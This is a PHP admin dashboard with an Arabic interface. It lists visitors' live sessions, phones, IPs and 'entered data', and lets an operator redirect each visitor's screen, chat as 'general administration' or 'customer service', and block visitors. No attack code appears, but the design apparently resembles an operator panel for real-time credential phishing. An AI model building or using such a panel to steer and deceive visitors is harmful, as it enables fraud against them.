<?php

declare(strict_types=1);

require __DIR__ . '/app/bootstrap.php';
require __DIR__ . '/app/control-auth.php';
require __DIR__ . '/app/sessions.php';

sw_control_require_login();
sw_session_mark_admin_current();

$pageTitle = 'لوحة التحكم';
$pageDescription = 'لوحة إدارة المستخدمين وتوجيه الشاشات.';
$pageId = 'control';
$bodyClass = 'admin-body';
$hideSiteFooter = true;
$bareLayout = true;
$themeColor = '#10233a';

$q = trim((string) ($_GET['q'] ?? ''));
sw_admin_presence_touch();
$apps = array_map(static fn(array $row): array => sw_session_live_payload($row), sw_session_list(['q' => $q, 'dedupe_clients' => true]));
$stats = sw_session_stats();
$adminsOnline = sw_admin_online_list();
$flowScreens = sw_flow_screens();

require __DIR__ . '/partials/header.php';
?>
<link rel="stylesheet" href="<?= e(asset_url('css/control-admin.css')) ?>">

<header class="admin-top">
    <div>
        <p class="admin-kicker">مراجعة داخلية</p>
        <h1>لوحة إدارة المستخدمين</h1>
        <p class="admin-today" data-today-date>
            <span>تاريخ اليوم</span>
            <strong><?= e(sw_today_label()) ?></strong>
        </p>
    </div>
    <div class="admin-top__actions">
        <a href="<?= e(app_url()) ?>">الموقع</a>
        <button type="button" class="admin-top__logout" data-logout-open>تسجيل الخروج</button>
    </div>
</header>

<section class="admin-main">
    <section class="admin-stats" aria-label="ملخص المستخدمين">
        <article class="admin-stat">
            <span class="admin-stat__label">إجمالي المستخدمين</span>
            <strong class="admin-stat__value" data-stat="total"><?= (int) $stats['total'] ?></strong>
        </article>
        <article class="admin-stat admin-stat--online">
            <span class="admin-stat__label">المتصلون الآن</span>
            <strong class="admin-stat__value" data-stat="online"><?= (int) $stats['online'] ?></strong>
        </article>
        <article class="admin-stat admin-stat--admins">
            <span class="admin-stat__label">المدراء المتصلون الآن</span>
            <strong class="admin-stat__value" data-stat="admins_online"><?= count($adminsOnline) ?></strong>
            <div class="admin-stat__meta" data-admins-list>
                <?php if ($adminsOnline === []): ?>
                    لا يوجد مدراء متصلون
                <?php else: ?>
                    <?= e(implode(' · ', array_map(static fn(array $a): string => (string) $a['username'], $adminsOnline))) ?>
                <?php endif; ?>
            </div>
        </article>
        <article class="admin-stat admin-stat--pending">
            <span class="admin-stat__label">قيد المراجعة</span>
            <strong class="admin-stat__value" data-stat="pending"><?= (int) $stats['pending'] ?></strong>
        </article>
        <article class="admin-stat admin-stat--blocked">
            <span class="admin-stat__label">محظورون</span>
            <strong class="admin-stat__value" data-stat="blocked"><?= (int) $stats['blocked'] ?></strong>
        </article>
    </section>

    <form class="admin-filters" method="get">
        <input type="search" name="q" value="<?= e($q) ?>" placeholder="بحث بالاسم أو رقم المرجع أو الهاتف">
        <button type="submit">تصفية</button>
    </form>

    <div class="admin-bulk" data-bulk-bar>
        <label class="admin-bulk__pick">
            <input type="checkbox" data-select-all>
            <span>تحديد جميع العملاء</span>
        </label>
        <span class="admin-bulk__count" data-bulk-count>0 محدد</span>
        <div class="admin-bulk__actions">
            <button type="button" class="admin-btn admin-btn--danger" data-bulk-delete disabled>حذف المحدد</button>
            <button type="button" class="admin-btn admin-btn--block" data-bulk-block disabled>حظر المحدد</button>
        </div>
    </div>

    <div class="admin-table-wrap">
        <table class="admin-table" id="applicationsTable">
            <thead>
                <tr>
                    <th class="admin-cell--check">
                        <input type="checkbox" data-select-all aria-label="تحديد جميع العملاء">
                    </th>
                    <th>رقم المرجع</th>
                    <th>اسم المستخدم</th>
                    <th>بيانات المراجعة</th>
                    <th>الاتصال</th>
                    <th>الشاشة الحالية</th>
                    <th>الدولة / IP</th>
                    <th>الوقت</th>
                    <th>تحكم</th>
                </tr>
            </thead>
            <tbody>
                <?php if ($apps === []): ?>
                    <tr><td colspan="9" class="admin-empty">لا يوجد مستخدمون بعد. افتح الموقع في تبويب آخر ليظهر هنا.</td></tr>
                <?php else: ?>
                    <?php foreach ($apps as $app): ?>
                        <?php
                        $online = !empty($app['is_online']);
                        $blocked = !empty($app['is_blocked']);
                        ?>
                        <tr data-id="<?= e($app['id']) ?>" data-blocked="<?= $blocked ? '1' : '0' ?>">
                            <td class="admin-cell admin-cell--check" data-label="تحديد">
                                <input type="checkbox" data-select-row aria-label="تحديد العميل">
                            </td>
                            <td class="admin-cell admin-cell--ref" data-label="رقم المرجع">
                                <code><?= e($app['reference']) ?></code>
                                <span class="admin-blocked-flag<?= $blocked ? ' is-on' : '' ?>" data-col="blocked-flag" <?= $blocked ? '' : 'hidden' ?>>محظور</span>
                            </td>
                            <td class="admin-cell admin-cell--customer" data-label="اسم المستخدم">
                                <strong data-col="name"><?= e($app['login_username'] ?: $app['customer_name']) ?></strong>
                                <div class="admin-muted" data-col="phone"><?= e($app['customer_phone'] !== '' ? $app['customer_phone'] : '—') ?></div>
                                <?php if (!empty($app['service_name'])): ?>
                                    <div class="admin-service" data-col="service">
                                        <span data-col="service-name"><?= e($app['service_name']) ?></span>
                                        <?php if (!empty($app['service_fee'])): ?>
                                            <span class="admin-service__fee" data-col="service-fee"><?= e($app['service_fee']) ?></span>
                                        <?php endif; ?>
                                    </div>
                                <?php else: ?>
                                    <div class="admin-service" data-col="service" hidden>
                                        <span data-col="service-name"></span>
                                        <span class="admin-service__fee" data-col="service-fee"></span>
                                    </div>
                                <?php endif; ?>
                            </td>
                            <td class="admin-cell admin-cell--details" data-label="بيانات المراجعة">
                                <button type="button" class="admin-btn admin-btn--details" data-open-details>التفاصيل</button>
                            </td>
                            <td class="admin-cell admin-cell--presence" data-col="presence" data-label="الاتصال">
                                <span class="admin-presence <?= $online ? 'is-online' : 'is-offline' ?>">
                                    <i></i><?= e($app['presence_label']) ?>
                                </span>
                            </td>
                            <td class="admin-cell admin-cell--screen" data-col="screen" data-label="الشاشة الحالية">
                                <span class="admin-screen-now"><?= e($app['current_screen_label']) ?></span>
                            </td>
                            <td class="admin-cell admin-cell--geo" data-col="geo" data-label="الدولة / IP">
                                <strong data-col="country"><?= e($app['client_country_label']) ?></strong>
                                <div class="admin-muted" data-col="ip"><?= e($app['client_ip'] !== '' ? $app['client_ip'] : '—') ?></div>
                            </td>
                            <td class="admin-cell admin-cell--date" data-col="date" data-label="الوقت">
                                <?= e($app['created_time'] ?? '') ?>
                            </td>
                            <td class="admin-cell admin-cell--control" data-label="تحكم">
                                <button type="button" class="admin-control-open" data-open-control>
                                    <span class="admin-control-open__title">تحكم</span>
                                    <span class="admin-control-open__hint">توجيه الشاشة</span>
                                </button>
                                <button type="button" class="admin-control-open" data-open-chat>
                                    <span class="admin-control-open__title">محادثة</span>
                                    <span class="admin-control-open__hint">رسائل العميل</span>
                                    <span class="admin-control-open__badge" data-chat-unread-badge hidden></span>
                                </button>
                                <div class="admin-drawer" data-control-drawer>
                                    <div class="admin-drawer__backdrop" data-close-control></div>
                                    <aside class="admin-drawer__panel" role="dialog" aria-modal="true">
                                        <header class="admin-drawer__head">
                                            <div>
                                                <p class="admin-drawer__kicker">لوحة التحكم</p>
                                                <h2 class="admin-drawer__title" data-drawer-title><?= e($app['customer_name']) ?></h2>
                                                <p class="admin-muted" data-drawer-phone><?= e($app['customer_phone']) ?></p>
                                            </div>
                                            <button type="button" class="admin-btn admin-btn--ghost admin-drawer__close" data-close-control>إغلاق</button>
                                        </header>
                                        <div class="admin-drawer__body">
                                            <section class="admin-drawer__section">
                                                <h3>توجيه الشاشة</h3>
                                                <div class="admin-screens" data-redirect-box>
                                                    <div class="admin-screens__flow">
                                                        <?php foreach ($flowScreens as $screen => $label): ?>
                                                            <button
                                                                type="button"
                                                                class="admin-screen-btn<?= ($app['redirect_to'] ?? '') === $screen ? ' is-current' : '' ?>"
                                                                data-redirect="<?= e($screen) ?>"
                                                            ><?= e($label) ?></button>
                                                        <?php endforeach; ?>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="admin-drawer__section admin-drawer__section--chat" data-chat-section>
                                                <h3>محادثة</h3>
                                                <div class="admin-chat" data-chat-root>
                                                    <div class="admin-chat__messages" data-chat-messages aria-live="polite"></div>
                                                    <div class="admin-chat__composer">
                                                        <div class="admin-chat__composer-left">
                                                            <select class="admin-chat__sender-select" data-chat-message-type aria-label="نوع الرسالة">
                                                                <option value="confirm">تأكيد</option>
                                                                <option value="alert">تنبيه</option>
                                                                <option value="reject">رفض</option>
                                                                <option value="important">مهم</option>
                                                                <option value="message" selected>رسالة</option>
                                                            </select>
                                                            <select class="admin-chat__sender-select" data-chat-sender aria-label="جهة الإرسال">
                                                                <option value="admin-general">الادارة العامة</option>
                                                                <option value="customer-service">خدمة العملاء</option>
                                                            </select>
                                                            <textarea
                                                                class="admin-chat__input"
                                                                rows="2"
                                                                maxlength="1000"
                                                                placeholder="اكتب رسالة..."
                                                                data-chat-input
                                                                aria-label="اكتب رسالة للمحادثة"
                                                            ></textarea>
                                                        </div>
                                                        <button type="button" class="admin-chat__send admin-btn" data-chat-send>إرسال</button>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="admin-drawer__section admin-drawer__section--danger">
                                                <h3>إجراءات</h3>
                                                <div class="admin-row-actions">
                                                    <button type="button" class="admin-btn admin-btn--danger" data-delete>حذف المستخدم</button>
                                                    <button type="button" class="admin-btn admin-btn--block" data-block>حظر كامل</button>
                                                    <button type="button" class="admin-btn admin-btn--unblock" data-unblock <?= $blocked ? '' : 'hidden' ?>>إلغاء الحظر</button>
                                                </div>
                                            </section>
                                        </div>
                                    </aside>
                                </div>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                <?php endif; ?>
            </tbody>
        </table>
    </div>
</section>

<div class="admin-confirm" id="adminConfirmModal" hidden>
    <div class="admin-confirm__backdrop" data-confirm-cancel></div>
    <div class="admin-confirm__card" role="dialog" aria-modal="true" aria-labelledby="adminConfirmTitle">
        <h2 id="adminConfirmTitle" data-confirm-title>تأكيد</h2>
        <p data-confirm-text>هل أنت متأكد؟</p>
        <div class="admin-confirm__actions">
            <button type="button" class="admin-btn admin-btn--ghost" data-confirm-cancel>إلغاء</button>
            <button type="button" class="admin-btn admin-btn--danger" data-confirm-ok>تأكيد</button>
        </div>
    </div>
</div>

<div class="admin-details-modal" id="adminDetailsModal" hidden>
    <div class="admin-details-modal__backdrop" data-close-details></div>
    <aside class="admin-details-modal__panel" role="dialog" aria-modal="true" aria-labelledby="adminDetailsTitle">
        <header class="admin-details-modal__head">
            <div>
                <p class="admin-details-modal__kicker">بيانات المراجعة</p>
                <h2 id="adminDetailsTitle" data-details-title>تفاصيل المستخدم</h2>
                <p class="admin-muted" data-details-sub></p>
            </div>
            <button type="button" class="admin-btn admin-btn--ghost" data-close-details>إغلاق</button>
        </header>
        <div class="admin-details-modal__body">
            <dl class="admin-details-modal__list" data-details-list></dl>
        </div>
    </aside>
</div>

<div class="admin-confirm" id="adminLogoutModal" hidden>
    <div class="admin-confirm__backdrop" data-logout-cancel></div>
    <div class="admin-confirm__card" role="dialog" aria-modal="true" aria-labelledby="adminLogoutTitle">
        <h2 id="adminLogoutTitle">تأكيد تسجيل الخروج</h2>
        <p>هل أنت متأكد من تسجيل الخروج من لوحة التحكم؟</p>
        <div class="admin-confirm__actions">
            <button type="button" class="admin-btn admin-btn--ghost" data-logout-cancel>إلغاء</button>
            <a class="admin-btn admin-btn--danger" href="<?= e(app_url('control-logout')) ?>" data-logout-confirm>نعم، تسجيل الخروج</a>
        </div>
    </div>
</div>

<script>
window.SW_ADMIN = {
    apiUrl: <?= json_encode(app_url('api/sessions.php'), JSON_UNESCAPED_UNICODE) ?>,
    chatApiUrl: <?= json_encode(app_url('api/chat.php'), JSON_UNESCAPED_UNICODE) ?>,
    lang: 'ar',
    flowScreens: <?= json_encode($flowScreens, JSON_UNESCAPED_UNICODE) ?>,
    filterQ: <?= json_encode($q, JSON_UNESCAPED_UNICODE) ?>,
    initialApps: <?= json_encode($apps, JSON_UNESCAPED_UNICODE) ?>,
    logoutUrl: <?= json_encode(app_url('control-logout'), JSON_UNESCAPED_UNICODE) ?>,
    labels: {
        reference: 'رقم المرجع',
        customer: 'اسم المستخدم',
        reviewData: 'بيانات المراجعة',
        details: 'التفاصيل',
        detailsTitle: 'تفاصيل المستخدم',
        viewData: 'البيانات المدخلة',
        noData: 'لا توجد بيانات بعد',
        presence: 'الاتصال',
        currentScreen: 'الشاشة الحالية',
        geo: 'الدولة / IP',
        date: 'الوقت',
        status: 'الحالة',
        today: 'تاريخ اليوم',
        control: 'تحكم',
        controlHint: 'توجيه الشاشة',
        controlPanel: 'لوحة التحكم',
        close: 'إغلاق',
        sendScreen: 'توجيه الشاشة',
        actions: 'إجراءات',
        delete: 'حذف المستخدم',
        block: 'حظر كامل',
        unblock: 'إلغاء الحظر',
        online: 'متصل',
        offline: 'غير متصل',
        unknown: 'غير معروف',
        blocked: 'محظور',
        empty: 'لا يوجد مستخدمون بعد.',
        selectAll: 'تحديد جميع العملاء',
        selectedCount: 'محدد',
        selectFirst: 'حدد عملاء أولاً',
        bulkDelete: 'حذف المحدد',
        bulkBlock: 'حظر المحدد',
        bulkDeleteTitle: 'تأكيد حذف المحددين',
        bulkDeleteText: 'هل أنت متأكد من حذف العملاء المحددين وجميع بياناتهم؟ لا يمكن التراجع.',
        bulkBlockTitle: 'تأكيد حظر المحددين',
        bulkBlockText: 'سيتم حظر الجلسات المحددة وكل عنوان IP وجهاز مرتبط بها. هل تريد المتابعة؟',
        chatTitle: 'محادثة',
        chatPlaceholder: 'اكتب رسالة...',
        chatEmpty: 'لا توجد رسائل بعد',
        chatButtonHint: 'رسائل العميل',
        chatSendError: 'تعذر إرسال الرسالة'
    }
};
</script>
<script src="<?= e(asset_url('js/control-admin.js')) ?>"></script>

<?php require __DIR__ . '/partials/footer.php'; ?>
